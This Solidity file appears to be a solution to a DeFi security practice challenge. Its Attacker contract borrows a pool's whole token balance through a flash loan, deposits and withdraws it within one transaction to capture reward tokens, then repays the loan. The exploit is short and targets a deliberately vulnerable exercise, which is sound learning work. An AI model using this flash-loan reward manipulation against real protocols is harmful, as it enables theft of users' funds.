// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './FlashLoanerPool.sol';
import './TheRewarderPool.sol';
import '../DamnValuableToken.sol';
import "hardhat/console.sol";

contract Attacker {
    FlashLoanerPool flashLoanerPool;
    TheRewarderPool theRewarderPool;

    DamnValuableToken damnValuableToken;
    RewardToken rewardToken;

    address player;

    constructor(FlashLoanerPool _flashLoanerPool, TheRewarderPool _theRewarderPool, DamnValuableToken _damnValuableToken, RewardToken _rewardToken) {
        flashLoanerPool = _flashLoanerPool;
        theRewarderPool = _theRewarderPool;
        damnValuableToken = _damnValuableToken;
        rewardToken = _rewardToken;
        player = msg.sender;
    }

    function attack() external {
        uint256 amount = damnValuableToken.balanceOf(address(flashLoanerPool));
        flashLoanerPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        damnValuableToken.approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);
        theRewarderPool.withdraw(amount);

        damnValuableToken.transfer(address(flashLoanerPool), amount);
        rewardToken.transfer(player, rewardToken.balanceOf(address(this)));
    }
}
